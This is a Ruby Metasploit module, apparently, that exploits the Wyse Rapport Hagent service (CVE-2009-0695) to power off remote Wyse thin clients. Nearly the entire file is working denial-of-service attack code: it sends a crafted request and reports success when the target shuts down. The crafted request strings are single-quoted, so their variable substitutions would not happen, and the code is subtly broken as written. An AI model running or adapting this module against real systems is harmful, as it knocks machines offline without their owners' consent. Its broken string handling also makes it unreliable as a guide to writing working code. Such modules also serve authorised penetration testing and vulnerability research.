require 'msf/core'

class Metasploit3 < Msf::Auxiliary
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Wyse Machine Remote Power off (DOS)',
			'Description'    => %q{
					This module exploits the Wyse Rapport Hagent service and cause
                                        remote power cycle (Power off the wyse machine remotely).
			},
			'Stance'         => Msf::Exploit::Stance::Aggressive,
			'Author'         => 'it.solunium@gmail.com',
			'Version'        => '$Revision: 14976 $',
			'References'     =>
				[
					['CVE', '2009-0695'],
					['OSVDB', '55839'],
					['US-CERT-VU', '654545'],
					['URL', 'http://snosoft.blogspot.com/'],
					['URL', 'http://www.theregister.co.uk/2009/07/10/wyse_remote_exploit_bugs/'],
					['URL', 'http://www.wyse.com/serviceandsupport/support/WSB09-01.zip'],
					['URL', 'http://www.wyse.com/serviceandsupport/Wyse%20Security%20Bulletin%20WSB09-01.pdf'],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Targets'        =>
				[
					[ 'Wyse Linux x86', {'Platform' => 'linux',}],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jun 13 2012'
		))

		register_options(
			[
				Opt::RPORT(80),
			], self.class)
	end


	def run


		# Connect to the target service
		print_status("Connecting to the target #{rhost}:#{rport}")
		if connect
                print_status("Connected...")
                end

		# Parameters

                genmac     = "00"+Rex::Text.rand_text(5).unpack("H*")[0]

		craft_req = '&V52&CI=3|'
                craft_req << 'MAC=#{genmac}|#{rhost}|'
                craft_req << 'RB=0|MT=3|'
                craft_req << '|HS=#{rhost}|PO=#{rport}|'
                craft_req << 'SPO=0|'

                # Send the malicious request
		sock.put(craft_req)

		# Download some response data
		resp = sock.get_once(-1, 10)
		print_status("Received: #{resp}")

                disconnect

		if not resp
			print_error("No reply from the target, this may not be a vulnerable system")
			return
		end

		if resp == '&00'
                print_status("#{rhost} execute command succefuly & power off.")
                return
                end

                #Exeptions
		rescue ::Rex::ConnectionRefused
			print_status("Couldn't connect to #{rhost}:#{rport} | Connection refused.")
                rescue ::Rex::HostUnreachable
			print_status("Couldn't connect to #{rhost}:#{rport} | Host unreachable")
                rescue  ::Rex::ConnectionTimeout
			print_status("Couldn't connect to #{rhost}:#{rport} | Connection time out")
		rescue ::Errno::ECONNRESET, ::Timeout::Error
			print_status("#{rhost} not responding.")

	end
end